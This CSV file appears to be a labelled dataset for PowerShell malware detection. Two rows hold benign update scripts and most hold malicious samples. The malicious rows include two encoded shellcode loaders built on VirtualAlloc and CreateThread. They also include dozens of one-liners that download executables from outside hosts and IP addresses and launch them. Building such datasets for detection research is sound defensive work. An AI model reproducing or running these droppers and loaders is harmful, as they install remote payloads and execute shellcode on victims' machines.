filename,label,source,primary_indicator,matched_indicators,indicator_count,has_indicator,raw_char_len,used_char_len,was_truncated,content
4186.ps1,benign,natural_overlap,Start-Process,Start-Process,2,True,2764,2764,False,"Set-Variable -Name File -Scope Local -Force

Function DeclareGlobalMemory {

	Set-Variable -Name Files -Scope Global -Force
	Set-Variable -Name RelativePath -Scope Global -Force

}

Function GlobalMemoryCleanup {

	Remove-Variable -Name Files -Scope Global -Force
	Remove-Variable -Name RelativePath -Scope Global -Force

}

Function RenameWindow ($Title) {

	
	Set-Variable -Name a -Scope Local -Force
	
	$a = (Get-Host).UI.RawUI
	$a.WindowTitle = $Title
	
	
	Remove-Variable -Name a -Scope Local -Force
}

Function GetRelativePath {
	$Global:RelativePath=(split-path $SCRIPT:MyInvocation.MyCommand.Path -parent)+""\""
}

Function GetFiles {

	$Global:Files = Get-ChildItem -Path $Global:RelativePath

}

Function CreateTempFolder ($FolderName) {
	
	$FolderName = ""c:\temp\""+$FolderName
	New-Item -Path $FolderName -ItemType Directory -Force
	
}

Function RemoveTempFolder ($FolderName) {
	
	$FolderName = ""c:\temp\""+$FolderName
	Remove-Item -Path $FolderName -Recurse -Force
	
}

Function ExtractCAB ($Name) {

	
	Set-Variable -Name arguments -Scope Local -Force
	Set-Variable -Name Dest -Scope Local -Force
	Set-Variable -Name Source -Scope Local -Force
	
	$Source = $Global:RelativePath+$Name
	$Dest = ""c:\temp\""+$Name.Substring(0,$Name.Length-4)
	$arguments = ""–F:*""+[char]32+$Source+[char]32+$Dest
	Start-Process -FilePath ""expand.exe"" -ArgumentList $arguments -Wait -PassThru

	
	Remove-Variable -Name arguments -Scope Local -Force
	Remove-Variable -Name Dest -Scope Local -Force
	Remove-Variable -Name Source -Scope Local -Force
}
















Function ApplyWindowsUpdate ($Name) {

	
	Set-Variable -Name App -Scope Local -Force
	Set-Variable -Name arguments -Scope Local -Force
	Set-Variable -Name index -Scope Local -Force
	Set-Variable -Name Result -Scope Local -Force
	
	$App = $Name
	$index = $App.IndexOf(""-KB"")+1
	$App = $App.Substring(0,$App.Length-4)
	$App = $App.Substring($index)
	Write-Host ""Installing""$App""....."" -NoNewline
	$arguments = $Global:RelativePath+$Name+[char]32+""/quiet /norestart""
	$Result = (Start-Process -FilePath ""wusa.exe"" -ArgumentList $arguments -Wait -PassThru).ExitCode
	If ($Result -eq ""3010"") {
		Write-Host ""Succeeded"" -ForegroundColor Yellow
	} else {
		Write-Host ""Failed with error code""$Result -ForegroundColor Red
	}

	
	Remove-Variable -Name App -Scope Local -Force
	Remove-Variable -Name arguments -Scope Local -Force
	Remove-Variable -Name index -Scope Local -Force
	Remove-Variable -Name Result -Scope Local -Force

}

cls
RenameWindow ""Windows Updates""
DeclareGlobalMemory
GetRelativePath
GetFiles
foreach ($File in $Files) {
	if (($File.Attributes -ne ""Directory"") -and ($File.Name -like ""*.msu"")) {
		ApplyWindowsUpdate $File.Name
	}
}
GlobalMemoryCleanup


Remove-Variable -Name File -Scope Local -Force"
4116.ps1,benign,natural_overlap,Start-Process,Start-Process,2,True,2846,2846,False,"[CmdletBinding()]
param
(
		[string]$BIOSPassword,
		[string]$Policy,
		[string]$ConsoleTitle = "" ""
)

function Get-RelativePath {

	
	[CmdletBinding()][OutputType([string])]
	param ()
	
	$Path = (split-path $SCRIPT:MyInvocation.MyCommand.Path -parent) + ""\""
	Return $Path
}

function Set-ConsoleTitle {

	
	[CmdletBinding()]
	param
	(
		[Parameter(Mandatory = $true)][String]
		$Title
	)
	
	$host.ui.RawUI.WindowTitle = $Title
}

function Get-Architecture {

	
	[CmdletBinding()]
	param ()
	
	$Architecture = Get-WmiObject -Class Win32_OperatingSystem | Select-Object OSArchitecture
	$Architecture = $Architecture.OSArchitecture
	
	Return $Architecture
}

function Install-Updates {

	
	[CmdletBinding()]
	param
	(
		[String]
		$DisplayName,
		[String]
		$Executable,
		[String]
		$Switches
	)
	
	Write-Host ""Install""$DisplayName""....."" -NoNewline
	If ((Test-Path $Executable) -eq $true) {
		$ErrCode = (Start-Process -FilePath $Executable -ArgumentList $Switches -Wait -Passthru).ExitCode
	} else {
		$ErrCode = 1
	}
	If (($ErrCode -eq 0) -or ($ErrCode -eq 1) -or ($ErrCode -eq 3010)) {
		Write-Host ""Success"" -ForegroundColor Yellow
	} else {
		Write-Host ""Failed with error code ""$ErrCode -ForegroundColor Red
	}
	
}

function Set-BIOSSetting {

	
	[CmdletBinding()]
	param
	(
		[string]
		$Name,
		[string]
		$Option,
		[string]
		$Setting,
		[string]
		$Drives,
		[string]
		$Architecture
	)
	
	If ($Architecture -eq ""32-bit"") {
		$EXE = $Env:PROGRAMFILES + ""\Dell\Command Configure\X86\cctk.exe""
	} else {
		$EXE = ${env:ProgramFiles(x86)} + ""\Dell\Command Configure\X86_64\cctk.exe""
	}
	$Argument = ""--"" + $Option + ""="" + $Setting
	Write-Host $Name""....."" -NoNewline
	If ((Test-Path $EXE) -eq $true) {
		$ErrCode = (Start-Process -FilePath $EXE -ArgumentList $Argument -Wait -Passthru).ExitCode
	} else {
		$ErrCode = 1
	}
	If (($ErrCode -eq 0) -or ($ErrCode -eq 240) -or ($ErrCode -eq 241)) {
		Write-Host ""Success"" -ForegroundColor Yellow
	} elseIf ($ErrCode -eq 119) {
		Write-Host ""Unavailable"" -ForegroundColor Green
	} else {
		Write-Host ""Failed with error code ""$ErrCode -ForegroundColor Red
	}
}

cls
Set-ConsoleTitle -Title $ConsoleTitle
$Architecture = Get-Architecture
If ($BIOSPassword -ne """") {
	Set-BIOSSetting -Name ""Disable BIOS Password"" -Option ""valsetuppwd"" -Setting $BIOSPassword"" --setuppwd="" -Drives """" -Architecture $Architecture
}
If ($Architecture -eq ""32-bit"") {
	$EXE = $Env:PROGRAMFILES + ""\Dell\CommandUpdate\dcu-cli.exe""
} else {
	$EXE = ${env:ProgramFiles(x86)} + ""\Dell\CommandUpdate\dcu-cli.exe""
}
If ($Policy -eq """") {
	$Parameters = "" ""
} else {
	$RelativePath = Get-RelativePath
	$Parameters = ""/policy "" + [char]34 + $RelativePath + $Policy + [char]34
}
If ((Test-Path $EXE) -eq $true) {
	Install-Updates -DisplayName ""Update Dell Components"" -Executable $EXE -Switches $Parameters
} else {
	Exit 1
}"
3321.ps1,malicious,natural_overlap,-EncodedCommand,IEX|-EncodedCommand|VirtualAlloc,7,True,2527,2527,False,"$EXRGL9 = '$cSE = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $cSE -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x5d,0x03,0x93,0x78,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$ZIA=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($ZIA.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$ZIA,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($EXRGL9));$EXRG = ""-EncodedCommand "";if([IntPtr]::Size -eq 8){$w8jB = $env:SystemRoot + ""\syswow64\WindowsPowerShell\v1.0\powershell"";iex ""& $w8jB $EXRG $e""}else{;iex ""& powershell $EXRG $e"";}"
3943.ps1,malicious,natural_overlap,-EncodedCommand,IEX|-EncodedCommand|VirtualAlloc,7,True,2941,2941,False,"$Wef = '$IED = ''[DllImport(""kernel32.dll"")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(""kernel32.dll"")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(""msvcrt.dll"")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type -memberDefinition $IED -Name ""Win32"" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xb8,0x26,0x6c,0xc9,0xb6,0xda,0xd4,0xd9,0x74,0x24,0xf4,0x5b,0x2b,0xc9,0xb1,0x57,0x31,0x43,0x15,0x03,0x43,0x15,0x83,0xeb,0xfc,0xe2,0xd3,0x90,0x21,0x34,0x1b,0x69,0xb2,0x59,0x92,0x8c,0x83,0x59,0xc0,0xc5,0xb4,0x69,0x83,0x88,0x38,0x01,0xc1,0x38,0xca,0x67,0xcd,0x4f,0x7b,0xcd,0x2b,0x61,0x7c,0x7e,0x0f,0xe0,0xfe,0x7d,0x43,0xc2,0x3f,0x4e,0x96,0x03,0x07,0xb3,0x5a,0x51,0xd0,0xbf,0xc8,0x46,0x55,0xf5,0xd0,0xed,0x25,0x1b,0x50,0x11,0xfd,0x1a,0x71,0x84,0x75,0x45,0x51,0x26,0x59,0xfd,0xd8,0x30,0xbe,0x38,0x93,0xcb,0x74,0xb6,0x22,0x1a,0x45,0x37,0x88,0x63,0x69,0xca,0xd1,0xa4,0x4e,0x35,0xa4,0xdc,0xac,0xc8,0xbe,0x1a,0xce,0x16,0x4b,0xb9,0x68,0xdc,0xeb,0x65,0x88,0x31,0x6d,0xed,0x86,0xfe,0xfa,0xa9,0x8a,0x01,0x2f,0xc2,0xb7,0x8a,0xce,0x05,0x3e,0xc8,0xf4,0x81,0x1a,0x8a,0x95,0x90,0xc6,0x7d,0xaa,0xc3,0xa8,0x22,0x0e,0x8f,0x45,0x36,0x23,0xd2,0x01,0xa6,0x5e,0x99,0xd1,0x5e,0xd7,0x08,0xbc,0xf7,0x43,0xa3,0x0c,0x7f,0x4d,0x34,0x72,0xaa,0xa0,0xe1,0xdf,0x06,0x91,0x46,0xb3,0xc0,0x2f,0x3f,0x4a,0xb6,0xb0,0x6a,0xff,0xeb,0x24,0x96,0x53,0x5f,0xd0,0xc3,0x42,0x5f,0x20,0x1c,0xe8,0x5f,0x20,0xdc,0xde,0x05,0x65,0x94,0x14,0xfb,0x65,0x74,0x3d,0xac,0xec,0xeb,0x7b,0xad,0x3b,0x9a,0x42,0x01,0xab,0x9d,0x78,0x46,0xaf,0xcd,0x2f,0xd5,0xf8,0xa2,0x99,0xb1,0xed,0x10,0x08,0x79,0x0e,0x4f,0xc2,0x17,0xfa,0x2f,0x83,0x67,0xc9,0xcf,0x53,0xe1,0xcd,0xba,0x57,0xa1,0x67,0x24,0x0e,0x29,0x02,0x1c,0x30,0x2f,0x13,0x75,0x1f,0x63,0xb8,0x25,0xf6,0xeb,0x13,0xcc,0xee,0x90,0x94,0x05,0x8b,0xa7,0x1f,0xac,0xdb,0x52,0x06,0xd8,0x13,0x29,0x1a,0x4f,0x2b,0x87,0x30,0x30,0xbb,0x28,0xd4,0xb0,0x3b,0x41,0xd4,0xb0,0x7b,0x91,0x87,0xd8,0x23,0x35,0x74,0xfc,0x2b,0xe0,0xe9,0xad,0x80,0x82,0xea,0x05,0x4f,0x95,0xd4,0xa9,0x8f,0xc6,0x42,0xc2,0x9d,0x7e,0xe3,0xf0,0x5d,0xab,0x76,0x34,0xd5,0x99,0xf3,0xb2,0x17,0xe1,0x86,0x7d,0x62,0x00,0xd0,0xbe,0xd2,0x22,0x95,0xbf,0x12,0x4d,0x64,0x70,0xd9,0x9c,0xb4,0x43,0x19,0xcf,0x89,0x9b,0x6d,0x21,0xdb,0xee,0xbf,0x3d;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$dyKx=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($dyKx.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$dyKx,0,0,0);for (;;){Start-sleep 60};';$e = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Wef));$vEF = ""-EncodedCommand "";if([IntPtr]::Size -eq 8){$i8Wb = $env:SystemRoot + ""\syswow64\WindowsPowerShell\v1.0\powershell"";iex ""& $i8Wb $vEF $e""}else{;iex ""& powershell $vEF $e"";}"
137.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,110,110,False,"(New-Object System.Net.WebClient).DownloadFile('http://cajos.in/0x/1.exe','mess.exe');Start-Process 'mess.exe'"
2683.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,110,110,False,"(New-Object System.Net.WebClient).DownloadFile('http://cajos.in/0x/1.exe','mess.exe');Start-Process 'mess.exe'"
2750.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,110,110,False,"(New-Object System.Net.WebClient).DownloadFile('http://cajos.in/0x/1.exe','mess.exe');Start-Process 'mess.exe'"
91.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,110,110,False,"(New-Object System.Net.WebClient).DownloadFile('http://cajos.in/0x/1.exe','mess.exe');Start-Process 'mess.exe'"
1927.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,115,115,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/nigga.exe','mess.exe');Start-Process 'mess.exe'"
527.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,116,116,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/kele.exe','fleeb.exe');Start-Process 'fleeb.exe'"
1417.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,117,117,False,"(New-Object System.Net.WebClient).DownloadFile('https://megadl.fr/?b5r5bstqd1','fleeb.exe');Start-Process 'fleeb.exe'"
765.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,117,117,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/abacoss.exe','mess.exe');Start-Process 'mess.exe'"
2770.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,119,119,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/com.exe','fleeble.exe');Start-Process 'fleeble.exe'"
2103.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,120,120,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/comu.exe','fleeble.exe');Start-Process 'fleeble.exe'"
3778.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,120,120,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/sect.exe','fleeble.exe');Start-Process 'fleeble.exe'"
1183.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,121,121,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/nigga.exe','fleeble.exe');Start-Process 'fleeble.exe'"
1478.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,121,121,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/opera.exe','fleeble.exe');Start-Process 'fleeble.exe'"
2355.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,121,121,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/opera.exe','fleeble.exe');Start-Process 'fleeble.exe'"
1882.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,123,123,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/kundelo.exe','fleeble.exe');Start-Process 'fleeble.exe'"
78.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,123,123,False,"(New-Object System.Net.WebClient).DownloadFile('http://sukem.zapto.org/word.exe','fleeble.exe');Start-Process 'fleeble.exe'"
3262.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,125,125,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/operamini.exe','fleeble.exe');Start-Process 'fleeble.exe'"
446.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,125,125,False,"(New-Object System.Net.WebClient).DownloadFile('http://worldnit.com/firefox32.exe','fleeble.exe');Start-Process 'fleeble.exe'"
1724.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,126,126,False,"(New-Object System.Net.WebClient).DownloadFile('http://www.wvhmedicine.ru/1/P2.exe','fleeble.exe');Start-Process 'fleeble.exe'"
2775.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,126,126,False,"(New-Object System.Net.WebClient).DownloadFile('http://danhviet.com.vn/z/v/doc.exe','fleeble.exe');Start-Process 'fleeble.exe'"
2291.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,127,127,False,"($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://198.50.137.173/b.exe', $dpl);Start-Process $dpl"
630.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,127,127,False,"($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://alonqood.com/obi.exe', $dpl);Start-Process $dpl"
708.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,127,127,False,"($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://198.50.137.173/a.exe', $dpl);Start-Process $dpl"
1405.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,129,129,False,"($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/bvudaf.exe', $dpl);Start-Process $dpl"
2884.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,129,129,False,"(New-Object System.Net.WebClient).DownloadFile('a.pomf.cat/msicxq.exe',""$env:TEMP\best.exe"");Start-Process (""$env:TEMP\best.exe"")"
696.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,129,129,False,"(New-Object System.Net.WebClient).DownloadFile('http://kiana.com/flowplayer/aquafresh.exe','fleeb.exe');Start-Process 'fleeb.exe'"
1662.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,131,131,False,"($dpl=$env:temp+'f.exe');(New-Object System.Net.WebClient).DownloadFile('http://201.130.72.171/andac.exe', $dpl);Start-Process $dpl"
1878.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,132,132,False,"(New-Object System.Net.WebClient).DownloadFile('http://daratad.5gbfree.com/uses/word.exe','fleeble.exe');Start-Process 'fleeble.exe'"
1614.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,133,133,False,"(New-Object System.Net.WebClient).DownloadFile('http://matkalv.5gbfree.com/noza/odeee.exe','fleeble.exe');Start-Process 'fleeble.exe'"
2458.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,133,133,False,"(New-Object System.Net.WebClient).DownloadFile('http://hinrichsen.de/assets/win1/win1.exe','fleeble.exe');Start-Process 'fleeble.exe'"
3425.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,133,133,False,"(New-Object System.Net.WebClient).DownloadFile('http://andersonken4791.pserver.ru/doc.exe','fleeble.exe');Start-Process 'fleeble.exe'"
3843.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,133,133,False,"(New-Object System.Net.WebClient).DownloadFile('http://matkalv.5gbfree.com/loso/fasoo.exe','fleeble.exe');Start-Process 'fleeble.exe'"
714.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,133,133,False,"(New-Object System.Net.WebClient).DownloadFile('http://ddl3.data.hu/get/0/9551162/ske.exe','fleeble.exe');Start-Process 'fleeble.exe'"
537.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,134,134,False,"(New-Object System.Net.WebClient).DownloadFile('http://ddl2.data.hu/get/0/9589621/k000.exe','fleeble.exe');Start-Process 'fleeble.exe'"
1052.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,136,136,False,"(New-Object System.Net.WebClient).DownloadFile('http://www.matrimonioadvisor.it/pariglia.exe','fleeble.exe');Start-Process 'fleeble.exe'"
2137.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,136,136,False,"(New-Object System.Net.WebClient).DownloadFile('http://ddl3.data.hu/get/0/9535517/yhaooo.exe','fleeble.exe');Start-Process 'fleeble.exe'"
2174.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,136,136,False,"(New-Object System.Net.WebClient).DownloadFile('http://rgho.st/68lJcGFLW',""$env:TEMP\winlex.exe"");Start-Process (""$env:TEMP\winlex.exe"")"
3801.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,136,136,False,"(New-Object System.Net.WebClient).DownloadFile('http://rgho.st/68lJcGFLW',""$env:TEMP\winlex.exe"");Start-Process (""$env:TEMP\winlex.exe"")"
438.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,136,136,False,"(New-Object System.Net.WebClient).DownloadFile('http://ddl7.data.hu/get/0/9552103/PFIfdp.exe','fleeble.exe');Start-Process 'fleeble.exe'"
119.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,137,137,False,"(New-Object System.Net.WebClient).DownloadFile('http://ddl7.data.hu/get/0/9507148/Patload.exe','fleeble.exe');Start-Process 'fleeble.exe'"
3524.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,137,137,False,"(New-Object System.Net.WebClient).DownloadFile('http://ddl7.data.hu/get/0/9507148/Patload.exe','fleeble.exe');Start-Process 'fleeble.exe'"
355.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,137,137,False,"(New-Object System.Net.WebClient).DownloadFile('http://toxicsolutions.ru/upload/praisefud.exe','fleeble.exe');Start-Process 'fleeble.exe'"
3976.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,137,137,False,"(New-Object System.Net.WebClient).DownloadFile('http://ddl7.data.hu/get/0/9507148/Patload.exe','fleeble.exe');Start-Process 'fleeble.exe'"
4014.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,137,137,False,"(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/ultxkr.exe',""$env:TEMP\uuuu.exe"");Start-Process (""$env:TEMP\uuuu.exe"")"
139.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient,2,True,138,138,False,"cmd /c powershell -Command (new-object System.Net.WebClient).Downloadfile('http://trax.x10.mx/count_vt.txt', 'C:\_AB\fake_.exe') ; 'Done.'"
1861.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,138,138,False,"(New-Object System.Net.WebClient).DownloadFile('http://allbestunlockerpro.com/flash.player.exe','fleeble.exe');Start-Process 'fleeble.exe'"
2312.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,138,138,False,"(New-Object System.Net.WebClient).DownloadFile('http://brokelimiteds.in/wp-admin/css/upload/ken1.exe','mess.exe');Start-Process 'mess.exe'"
1269.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,139,139,False,"(New-Object System.Net.WebClient).DownloadFile('http://brokelimiteds.in/wp-admin/css/upload/Order.exe','mess.exe');Start-Process 'mess.exe'"
1322.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,139,139,False,"(New-Object System.Net.WebClient).DownloadFile('http://hnng.moe/f/Iot',""$env:TEMP\Microsoft.exe"");Start-Process (""$env:TEMP\Microsoft.exe"")"
2438.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,139,139,False,"(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/pabfzv.exe',""$env:TEMP\testu.exe"");Start-Process (""$env:TEMP\testu.exe"")"
3879.ps1,malicious,natural_overlap,DownloadFile,DownloadFile|Net.WebClient|Start-Process,3,True,139,139,False,"(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/pabfzv.exe',""$env:TEMP\testu.exe"");Start-Process (""$env:TEMP\testu.exe"")"
